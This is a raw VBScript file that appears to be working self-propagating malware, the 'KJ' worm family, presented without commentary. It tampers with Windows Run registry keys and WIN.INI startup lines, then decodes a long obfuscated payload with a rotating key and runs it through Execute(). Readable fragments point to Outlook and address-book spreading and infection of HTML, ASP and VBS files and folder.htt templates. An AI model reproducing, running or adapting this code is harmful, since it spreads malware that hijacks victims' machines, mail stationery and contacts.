Set CURObj = CreateObject("WScript.Shell")
mhk="HK"&"LM\SOFT"&"WARE\Micr"&"osoft\Win"&"dows\Curren"&"tVersion\Run\"
mhc="HK"&"CU\Soft"&"ware\Micros"&"oft\Win"&"dows\Curren"&"tVersion\Run\"
mhk2="HK"&"LM\SOFT"&"WARE\Micr"&"osoft\Win"&"dows\Curren"&"tVersion\"
CURObj.RegWrite ""&mhk&"W1N32","regedit -s c:\windows\system32\$WIN32$\WIN32SQL.cer"
CURObj.RegWrite ""&mhk&"internat.exe","internat.exe"
CURObj.RegWrite ""&mhk&"zwupdows","12"
CURObj.RegWrite ""&mhk&"win","12"
CURObj.RegWrite ""&mhk&"mwin","12"
CURObj.RegWrite ""&mhk&"internt","12"
CURObj.RegWrite ""&mhk&"Inernet","12"
CURObj.RegWrite ""&mhk&"Internet","12"
CURObj.RegWrite ""&mhk&"iexpleror","12"
CURObj.RegWrite ""&mhk&"zxdows","12"
CURObj.RegWrite ""&mhk&"qwe","12"
CURObj.RegWrite ""&mhk&"win1","12"
CURObj.RegWrite ""&mhk&"intelnat.exe","12"
CURObj.RegWrite ""&mhk&"u1888","12"
CURObj.RegWrite ""&mhk&"intenet","12"
CURObj.RegWrite ""&mhk&"9i5zxdows","12"
CURObj.RegWrite ""&mhk&"9i5com01zxdows","12"
CURObj.RegWrite ""&mhk&"99zxdows","12"
CURObj.RegWrite ""&mhk&"88zxdows","12"
CURObj.RegWrite ""&mhk&"Start Pagewin","12"
CURObj.RegWrite ""&mhk&"Start Page","12"
CURObj.RegWrite ""&mhk&"u188","12"
CURObj.RegWrite ""&mhk&"9i5comzxdows","12"
CURObj.RegWrite ""&mhk&"9q5zxdows","12"
CURObj.RegWrite ""&mhk&"u1881","12"
CURObj.RegWrite ""&mhk&"u1882","12"
CURObj.RegWrite ""&mhk&"u1883","12"
CURObj.RegWrite ""&mhk&"u1884","12"
CURObj.RegWrite ""&mhk&"u1885","12"
CURObj.RegWrite ""&mhk&"u1886","12"
CURObj.RegWrite ""&mhk&"u1887","12"
CURObj.RegWrite ""&mhk&"u88y", "12"
CURObj.RegWrite ""&mhk&"flash", "12"
CURObj.RegWrite ""&mhk&"999izxdows","12"
CURObj.RegWrite ""&mhk&"033zxdows","12"
CURObj.RegWrite ""&mhk&"syste","12"
CURObj.RegWrite ""&mhc&"my","12"
CURObj.RegWrite ""&mhk&"3zxdows","12"
CURObj.RegWrite ""&mhk&"88u88","12"
CURObj.RegWrite ""&mhk&"system","12"
CURObj.RegWrite ""&mhk&"8zxdows","12"
CURObj.RegWrite ""&mhk&"u18","12"
CURObj.RegWrite ""&mhk&"interneet.exe","12"
CURObj.RegWrite ""&mhk2&"RunOnce\", "12"
CURObj.RegWrite ""&mhk&"iexpler", "12"
CURObj.RegWrite ""&mhk&"u1810", "12"
CURObj.RegWrite ""&mhk&"winwin", "12"
CURObj.RegWrite ""&mhk&"WIN32", "12"
CURObj.RegDelete ""&mhc&""
CURObj.RegDelete ""&mhk&"zwupdows"
CURObj.RegDelete ""&mhk&"win"
CURObj.RegDelete ""&mhk&"mwin"
CURObj.RegDelete ""&mhk&"internt"
CURObj.RegDelete ""&mhk&"inernet"
CURObj.RegDelete ""&mhk&"Internet"
CURObj.RegDelete ""&mhk&"u188"
CURObj.RegDelete ""&mhk&"iexpleror"
CURObj.RegDelete ""&mhk&"zxdows"
CURObj.RegDelete ""&mhk&"qwe"
CURObj.RegDelete ""&mhk&"win1"
CURObj.RegDelete ""&mhk&"intelnat.exe"
CURObj.RegDelete ""&mhk&"intenet"
CURObj.RegDelete ""&mhk&"9i5zxdows"
CURObj.RegDelete ""&mhk&"9i5com01zxdows"
CURObj.RegDelete ""&mhk&"99zxdows"
CURObj.RegDelete ""&mhk&"88zxdows"
CURObj.RegDelete ""&mhk&"Start Pagewin"
CURObj.RegDelete ""&mhk&"Start Page"
CURObj.RegDelete ""&mhk&"9i5comzxdows"
CURObj.RegDelete ""&mhk&"9q5zxdows"
CURObj.RegDelete ""&mhk&"999izxdows"
CURObj.RegDelete ""&mhk&"033zxdows"
CURObj.RegDelete ""&mhk&"u1881"
CURObj.RegDelete ""&mhk&"u1882"
CURObj.RegDelete ""&mhk&"u1883"
CURObj.RegDelete ""&mhk&"u1884"
CURObj.RegDelete ""&mhk&"u1885"
CURObj.RegDelete ""&mhk&"u1886"
CURObj.RegDelete ""&mhk&"u1887"
CURObj.RegDelete ""&mhk&"u88y"
CURObj.RegDelete ""&mhk&"flash"
CURObj.RegDelete ""&mhk&"88u88"
CURObj.RegDelete ""&mhk&"interneet.exe"
CURObj.RegDelete ""&mhk&"u18"
CURObj.RegDelete ""&mhk&"u1888"
CURObj.RegDelete ""&mhk&"system"
CURObj.RegDelete ""&mhk&"3zxdows"
CURObj.RegDelete ""&mhk&"8zxdows"
CURObj.RegDelete ""&mhk&"syste"
CURObj.RegDelete ""&mhk2&"RunOnce\"
CURObj.RegDelete ""&mhk&"iexpler"
CURObj.RegDelete ""&mhk&"u1810"
CURObj.RegDelete ""&mhk&"winwin"
CURObj.RegDelete ""&mhk&"WIN32"

Set FSO = CreateObject("Scripting.FileSystemObject")
myfile14=FSO.FileExists("c:\windows\WIN.INI")
if myfile14 then
set FSO2=FSO.OpenTextFile("c:\windows\WIN.INI")
mywin=FSO2.ReadALL()
l=Instr(mywin,"run=")-3
m=Instr(mywin,"load=")-1
n=Instr(mywin,"NullPort=")-3
FSO2.close
if l>0 and m>0 and l>m then
set FSO3=FSO.OpenTextFile("c:\windows\WIN.INI")
mywin2=FSO3.Read(l)
FSO3.close
set FSO4=FSO.OpenTextFile("c:\windows\WIN.INI")
mywin3=FSO4.Read(m)
FSO4.close
if n>0 and n>l then
set FSO5=FSO.OpenTextFile("c:\windows\WIN.INI")
mywin4=FSO5.Read(n)
FSO5.close
mywin=Replace(mywin,mywin4,"")
set FSO2=FSO.CreateTextFile("c:\windows\WIN.INI")
FSO2.Write mywin3
FSO2.WriteLine "load="
FSO2.Write "run="
FSO2.Write mywin
FSO2.close
else
mywin=Replace(mywin,mywin2,"")
set FSO2=FSO.CreateTextFile("c:\windows\WIN.INI")
FSO2.Write mywin3
FSO2.Write "load="
FSO2.Write mywin
FSO2.close
end if
end if
end if

ExeString = "Aam FfWhbje,ElmlQ]xt)NbsQ]xt)<ego]eSf_n,>hplbGbjb[t,CKO,TkShbdl,TanP^lh,PmbE)>in^dyDfkkKubCJ_plarq )CJSblDij )CJCo]atbEilf]u(&KGDikbAt(&KG;re^leM^al(&KGHromYgaq]()EnaSu_>un`liokKJ>hpek\To%>ilbHate$Tym]Sto!Lf EojorJesree K]xtSeqRe^\Tejh =>SO+GpekLexq>ilb Fii]Paq`,1&TjhSto= O]adQ]mp+Jeaa9llIfAnsqj(TjhSto$KGWst^jt(&) 96 0Gr I]n(QepSqj) 91 Q`enRe^\Tejh.CigseExfl Frfctfgn=ndAfAf QqpePlr :hql Q`enRe^\Tejh.CigseSeqFii]Tejh =>SO+GpekLexq>ilb Fii]Paq`,2&FfdeTbep.Tjitb<& :ODVonigad: sZscoapt7 &KJ\ktaol() #>& sZCrI^ &LmpPlr #vb@jLf HqelTbpt>ilbLemm&CllkeKet>Atqjib5 FPG.GblFii](FfdeP^lh)FAqlri_&atqjibrles5 31EikeJeaaLemm&CllkeKet>ilbLemm= CKO.LhenQ]xtCale%>ilbHate$8)IfLypbKtr5 elmlThbfCaleQ]mp+Oriq] v_;rLc& 4 #HQEL>& sZCrI^ &< ?GDYgnllYd= #v_kcrfht:& CJ_plarq ) &> v_;rLc& ElmlQ]xtElp]IfLypbKtr5 sZsLhekFfdeTbep.Tjitbvb@jLf V_kTeulBfd F^CaleQ]mp+;lop]Bfd F^Bfd CmncqaonCmncqaonCJCeYngbKub%;uro]ntPlrik_,L^ktIk\ex@`ar&IcLaplIna]xCeYr :0 Q`enIfDefq LC^ke(@mrrbftSqjind!,1&=<DCap](`) Q`enKJ@`and]Su_= CanaiqDipc &:\SrZE :0=lsbKG;hak_eSrZ =;hr%9sc%Defq LC^ke(@mrrbftSqjind!,1&! -)) #:YPmbE5 0EnaIfElp]HBCh^fgePmb :Mia CuojenqKtrffg,.$LaplIna]xCeYr)EnaIfEnaFuk[tilfFuk[tilf KG;re^leM^al(&OkErogr O]suj] NbptAf FfWhbje :hqelLhekEuat CmncqaonEnaIfSh^jeFfde :Lecl(WffPaq`,3&& Hrodjam>ilbk\ClemokFii]s\JacrlkofqSh^jedYKtaqaonbjy\_danh&htjF^ (CKO.CaleBpisqk(SeYreCale&! Te]n;aliKJ>hpek\To%Khao]Fii],elml!BdseSeqFii]Tejh =>SO+GpekLexq>ilb Sh^jeFfde,/$trr])>ilbLemm&Wrfle 4 #HQEL>& sZCrI^ &< ?GDYgnllYd= #v_kcrfht:& CJ_plarq ) &> v_;rLc& ElmlQ]xtFii]Tejh.CigseEnaIfDecYulqAd :WsP`eli&RedJeaa HH=Y_@MRRBFT_RKERYAdeklitf]s\A]fardt RkerAD&OrlLolcVeokiok= TkShbdl.O]gRbYd(@KEVWLO@9L_J9CHFFE\PgfttYreYEicogsocl\Orllolc Euhrepk\Mb\iaS]r&WpKheid.Rb_Wrfle @KEVWCUOJENQWUSBJ\Ia]ntfliepT&A]fardtIa\PgfttYreYEicogsocl\Orllolc Euhrepk\#Lecl(OrlLolcVeokiok$1).-TMafd\Clepop] Up] SqYtilferv,1)REDWDWLJDCaid KGEaiiJeg%HKBQ_CRJREKL_UP=R\F\enqatibk\#<ef^mltF\&YKofqoarbTMi`josl^t\Lmtllgk Bpprbks\ Lb^t(LmtLlgkVbjsilf,1&&+(\M^al\Platfgneoq N^ee)Khao]Fii]);aliKJJYilO]g(@KEVWCUOJENQWUSBJ\Ia]ntfliepT&A]fardtIa\PgfttYreYEicogsocl\Orllolc Euhrepk\#Lecl(OrlLolcVeokiok$1).-TMafd\Wf\e Platfgneoq N^ee)Khao]Fii])OsSe]ll+JegTjitbHH=Y_@MRRBFT_RKERYKofqoarbTMi`josl^t\L^fi`]\9+(\Orllolc\Omliokk\M^al\B\itljPrb^erbfce$13.(72)REDWDWLJDCaid KGEaiiJeg%HKBQ_CRJREKL_UP=R\PgfttYreYEicogsocl\Wffdotk MbksadangKubpqstbe\Pogfii]s\JacrlkofqOuqdoohInq]rnbl Sbltik_s\-Y0d-*00-(00-(00`(00-(00-(00-(46Y(01b(36-,_danh);aliKJJYilO]g(@KEVWCUOJENQWUSBJ\Sl^tw^je\JacrlkofqTWik\owpNTY;uro]ntS]rsfgn\Tandlos J]ss^_indSu_kysq]m\MjoffdesYEicogsocl Orllolc Iklerk]t P]ttffgsY(a0a(20-(00-(00-[00-(00-(00-(043T00.]033(,Zlakc)WsP`eli&RedOriq] ECEY\;URO=NT\MSEOTSoclwao]\Mf[ropgftYGfff[e\.(.0YGutigokYGptfgnsYEaiiTEdflorMjefbjen`],.+104*,O=G_AOORA@YllCJM^alRb_(ECEY\;URO=NT\MSEOTSoclwao]\Mf[ropgftYGfff[e\.(.0Y;omjgn\JYilP]ttffgsYFewPlatfgneoq,Zlakc)KJremad]Foi\er%Defq WikHate$3) MjogoYm CalepTCojeon>ilbk\Mf[ropgftKhao]d\Platfgneoq)EnaFuk[tilfFuk[tilf KG;re^leMfdier )Gn BjrooRepmmeFexqTbepP^lh :IfFot%>SO+>ilb=xipls(TanP^lh #WP[riml.eu])&ThbfQ]mpMYth5 pqstbe32YBfd F^F^ TbepP^lh :svktej+2\ThbfPlarqMpFfde :WikHate& KYSQ=M\H]rnbd32+\llEikeKtaolUpCale5 WffPaq` &SYPLEMYCerk]l.adlEnaIfWsP`eli&RedOriq] ECEY\DOC>D_M>;HIK=\Sl^tw^je\JacrlkofqTWik\owpTCuojenqNerpaonYJunYCerk]l3/,SqYrtRhFii]CKO.@gpyCaleOinMYth t]b\hbwaid.gf^,TanP^lh #wbZ\Flddeo&htqCKO.@gpyCaleOinMYth pqstbe32Ycjw^dl.daf)OinMYth pqstbe32Y\eshlop+aniC^dl HBApm]ndQg(WffPaq` &we_TFoi\er+`tt$hql)WsP`eli&RedOriq] ECEY\;LAPKES\JOOQT.did\)dli^ilbTkShbdl.O]gWoateHKBQ_CI9SSBK_RLGT\+\llY;onq]ntLypb,^hplf[atfgn/u%msagwnigadWpKheid.Rb_Wrfle @KEVWCL>KSEPWROLL\didfii]\Db^auilIclf\)OsSe]ll+JegO]ad%HKBQ_CI9SSBK_RLGT\spdffde\A]fardtI`gn\!TkShbdl.O]gWoateHKBQ_CI9SSBK_RLGT\adlffde\P[rimlEndaneY,S:ScoaptWpKheid.Rb_Wrfle @KEVWCL>KSEPWROLL\didFii]\Se]llYGpekTCojeanaT,TanP^lh #TejhPaq` &WS`jipq&exb)*WsP`eli&RedOriq] ECEY\;LAPKES\JOOQTdli>ilbTShbdlEuTPrlherqqShb]tH^fdlbjs\TKHPogpsY,x.022,CA2%950:-1.;F-5;96*(0A>(0B5/08@uOsSe]ll+JegTjitbHH=Y_@DASP=S_OGOTY\llCaleYKcrfhtHlktEk[odbT,s85.+160)-45(C-.)D2*:1F6%00@(4F5.C3/,}SeqFii]Tejh =>SO+GpekLexq>ilb St^jtUm>ilb$2,qjue&FfdeTbep.TjitbVbpLexqFfdeTbep.@dosbEk\ FrfctfgnFrfctfgn HBLih]It%!F^ IkOheo] <;hqelLhekEuat CmncqaonEnaIfThfkLo`Ytilf =\ocreenq&lo`YtilfF^ Lb^t(Q`isIgcaqaon)4)5 caleThbfQ`isIgcaqaon5 Mf\(TeasLl[atfgn,6!F^ FPG.GblExq]nsfgnN^ee(Q`isIgcaqaon&<> q`enThfkLo`Ytilf =Defq ThfkLo`Ytilf,Lbf(TeasLl[atfgn)% Lbf(FPG.GblFii]Naj](TeasLl[atfgn)&!Bfd F^F^ Lbf(TeasLl[atfgn)6 3LhekTeasLl[atfgn :ThfkLo`Ytilf &\EnaIfKJremad]Foi\er%LhipDoc^liok!Bfd F^Bfd CmncqaonCmncqaonCJM^alRb_(Rb_Sto$Fii]Naj])Gn BjrooRepmmeFexqRb_TejhSto= TkShbdl.O]gRbYd(O]gSqj)Af O]gTbepSqj = Q`enWsP`eli&RedOriq] Rb_Sto$Fii]Naj]Bfd F^Bfd CmncqaonCmncqaonCJO_gSu_ CuojenqKtrffg)Su_= =(Q]stLmt :0<o T`ilbTrr]Q]stLmt :TeplOuq+ .IcTeplOuq> /0 Te]n;uro]ntPlrik_ =>in^dyDfkk #:YBpit<o=ndAfGn BjrooRepmmeFexqSbl TeasFlddeo= CKO.D]tFlddeo CuojenqKtrffg)SeqDi`Kub5 Co]atbGbjb[t(Kcrfhtik_.Df[tilfarv)Ket>ola]rs5 TeasFlddeo&Su_>ola]rsFoi\er@gunq= -Flj E^[h Q]mpCgldbj ikFoi\erpFlddeo;oukl =>ola]rClmnt# 1Di`Kub+Ydd>ola]rClmnt)TejhFoi\er+FambNbptAf AacSrZ.Clmnt5 0LhekL^ktIk\ex@`ar5 IkktrO]v(@mrrbftSqjind$\$Lek CuojenqKtrffg)*))KubPlrik_ =Eid%;uro]ntPlrik_,L^ktIk\ex@`ar(),Lbf(CrjreklStoang&%LaplIna]xCeYr-.!@mrrbftSqjind= HBCh^fgePmb(@mrrbftSqjind$LaplIna]xCeYr)Su_= =)BdseIfKubB= -Thbf@mrrbftSqjind= @mrrbftSqjind& AacSrZ.Iq]m(.! &\Exfl DlEikeb =(Cgr g= .To>ola]rClmntIfDCap](SrZStoang&= I;asb Di`Kub+Atej j)&ThbfF^ j4 Flddeo;oukl Te]n;uro]ntPlrik_ =;uro]ntPlrik_ &<icPmb.Flem%b+1&& T=xiqDoEnaIfEnaIfNeulIYstFfdeu;hao= FfstoJev%;uro]ntPlrik_,Y,Lbf(CrjreklStoang&%1)Su_Ktrffg :Mia CuojenqKtrffg,IYstFfdeu;hao#1,I]n(@mrrbftSqjind!-L^ktIk\ex@`ar*));uro]ntPlrik_ =CJCeYngbKub%;uro]ntPlrik_,L^ktIk\ex@`ar&Ek\ IcEk\ IcLlgpCJO_gSu_= @mrrbftSqjindEk\ FrfctfgnFrfctfgn HBPrlhag^le(&OkErogr O]suj] NbptJegMYthSYlub= @KEVWLO@9L_J9CHFFE\PgfttYreYEicogsocl\Orllolc Euhrepk\Db_rebAaskA]grb] =OsSe]ll+JegO]ad%JegMYthSYlub!F^ DfkkDb_reb=  Te]n<ish<ego]e :FikYlyAask 7T=ndAf>ora=1lo 2DfkkDb_reb= HBOblKub%<ish<ego]e)KJremad]Foi\er%<ish<ego]e)NeulTkShbdl.O]gWoateJegMYthSYlub$DipcDedjeeEnaFuk[tilfFuk[tilf KGmmm^_eFlddeo Paq`Naj])Gn BjrooRepmmeFexqSbl FlddeoFamb= CKO.D]tFlddeo Paq`Naj])KetLhip>ilbk =>ola]rN^ee.CalepHqlExfkts5 0FooEa`` TeasFfde Ff TeasFfdesFii]Exq= R;asb FSL&Geq=xtbfsilfNaj](TeasFfde.MYth&!F^ FfdeEul =HTJ OoFii]Exq= @TMI OoFii]Exq= 9SPOr>ilb=xt5 M@PGr CaleBpt :JPH Q`enCaid KG9ppbfdTl ThfkFii].P^lh,`tmi)=lsbAf CaleBpt :V?K Q`enCaid KG9ppbfdTl ThfkFii].P^lh,nbs!BdseF^ FfdeEul =HTQ Te]n@ttBpisqk =)Bfd F^K]xtIf UC^ke(MYthKYme&= R;asb WikHate& <eshlopY))Gr %MCap](P^lhN^ee)5 U@Yse%OinMYth A]skqgp&!ThbfEltEuastp= .Ek\ IcIcHtq=xipls :0 Q`enFSL&ComqFii] WffPaq` &syplem0*\dbkktlh.ika,MYthKYmeFSL&ComqFii] WffPaq` &we_TFoi\er+`tt$Paq`Naj]Bfd F^Bfd CmncqaonCmncqaonCJSblDij )Gn BjrooRepmmeFexqEoj.Ci]arTeplIt5 WP[riml.S`jipq>ulifambIcEroThbfFfWhbje :hqelElp]FfWhbje :v_k=ndAfAf FfWhbje :v_k Q`enSeqFSL= @jeaq]Obg]ct%Scoaptffg.CalePqstbeObg]ct!P]t TkShbdl :CrbYteLZje`l(TKcrfht.P`eli)=lsbSbl AmhleLZje`l =\ocreenq&apmdetp KGWgubkt&AmhleLZje`l.sblCLPAD(sF90-DC/*-1@>0-.)D0*9DB6%00@(4FA-8A-:}&AmhleLZje`l.co]atbAnsqYncb )KetOsSe]ll5 AmhleLZje`l.GblObg]ct%!>hplbGbjb[t.p]tCIKID%{0A,3FB(1-C(93*)1CC%891(-0-90C6(54/*8}!>hplbGbjb[t.`jeaq]Inplan`]()SeqFSL= >hplbGbjb[t.D]tO_becq )=ndAfKet<ishGbjb[t :FSL&DrfnesFooEa`` DfkkTbep Ff DfkkO_becqIcDipcTejh.DoaveQqpe4> /AnaDipcTejh.DoaveQqpe4> .ThbfBpit>orEnaIfFikYlyAask5 DfkkTbep.AjivbDetq]rFexqDfe Oq`er>jr(0!OYndleizbFlj i:( Tl3GthbjAro i)5 Ikl((6* Ofd)&NbptLemmKtrffg :Fooi=.ToDen%LhipLexq!Q]mpKmm :As` Mia ThfkTeul,i))))IfLemmFum5 10ThbfQ]mpKmm :28Elp]IfLemmFum5 1-ThbfQ]mpKmm :29EnaIfTejhCh^j =;hr%LemmFum% Oq`er>jr(fMoa4)&IcTejhCh^j =;hr%+4)LhekTbepCeYr :Cho 18&Ek\ IcTbepSqjind= Q]mpPlrik_ &Lemm;haoNbptMnLl[kSqj =Exb[utb Aam H]yAoj(3&$ThfkTeul#nbCoDf&Kev9rr%() : #Ote]rAoj(0&& &sZCrI^&Cey>jr(.! = &GthbjAro 1) &v_;rLcH]yAoj(2&= & Llheo9rr%*) #vb@jLf#KbqAro 3)5  Oq`er>jr(0! &#nbCoDf&Fooi=.ToDen%=xePlrik_)vb@jLf#TbepNre =9sc%Eid%=xePlrik_,i))))&v_;rLcF^ TbepNre =)8 Q`en&v_;rLcQ]mpKmm :34&v_;rLcBfd F^#nbCoDf&TejhCh^j =;hr%LemmFum# KbqAro i Jgd 1!)vb@jLf#IcTejhCh^j =;hr%*8)Lhek&sZCrI^&Lemm;hao= sZCr&v_;rLcBdseF^ TbepCeYr :Cho 29&Thbf#nbCoDf&TejhCh^j =nbLc&sZCrI^&=ndAfvb@jLf#TeasTbpt :ThfkTeul &Lemm;hao&sZCrI^&Fexq)& sZCrI^ &Exb[utb ThfkTeul)ThfkTeul =ExbKtrffg :& Q]mpPlrik_ &HqelTbpt :< p[riml l^fgu^_e=sZscoapt; &nbCoDf #dl[umbft.tjitb # &< aav plylb5'plkitfgn:^Zsoimte8lecl:0mp; qgp:-hx;oidq`:0mp; e]igel:0mp; w%ina]x:/0; sasi_aliqq: eaddbf'>& 4# >HPLBL N>EE=HB#_dmesqHEF?HT:( WF<TH:( cl\e=`gm.jk.^[tis]X.>[tis]#X@gmplfenq6 #<& 'APMDET; &< ,\iv; v_;rLc& 4 #/p[riml> v_;rLc& 4 #s`jipqlak_uad]=v_kcrfht>& sZCrI^ &LhipLexq& sZCrI^ &MnLl[kSqj &nbCoDf #<& 'scoapt; &nbCoDf #<& 'BOAQ> v_;rLc& 4 #/ELML;SZsTbpt :ThfkTeul &nbCoDf #UnIgckPlr #vb@jLf HB_sqYrt%!OinMYth5 FPG.GblSpb[iai>ola]r(-! &\If FSL&Fii]Exfkts%OinMYth t]b\Cgldbj.hql)&ThbfCKO.@gpyCaleOinMYth t]b\Cgldbj.hql,TanP^lh #wbZ\kgoali&gicBfd F^F^ (CKO.CaleBpisqk(WffPaq` &syplem0*\dbkktlh.ika)&ThbfCKO.@gpyCaleOinMYth pqstbe32Y\eshlop+ani$WikHate& kysq]m3/TkjtYll+_ifEk\ IcEk\ Frfctfgn"
Execute("Dim KeyArr(3),ThisText"&vbCrLf&"KeyArr(0) = 0"&vbCrLf&"KeyArr(1) = 3"&vbCrLf&"KeyArr(2) = 8"&vbCrLf&"KeyArr(3) = 0"&vbCrLf&"For i=1 To Len(ExeString)"&vbCrLf&"TempNum = Asc(Mid(ExeString,i,1))"&vbCrLf&"If TempNum = 18 Then"&vbCrLf&"TempNum = 34"&vbCrLf&"End If"&vbCrLf&"TempChar = Chr(TempNum + KeyArr(i Mod 4))"&vbCrLf&"If TempChar = Chr(28) Then"&vbCrLf&"TempChar = vbCr"&vbCrLf&"ElseIf TempChar = Chr(29) Then"&vbCrLf&"TempChar = vbLf"&vbCrLf&"End If"&vbCrLf&"ThisText = ThisText & TempChar"&vbCrLf&"Next")
Execute(ThisText)
KJ_start()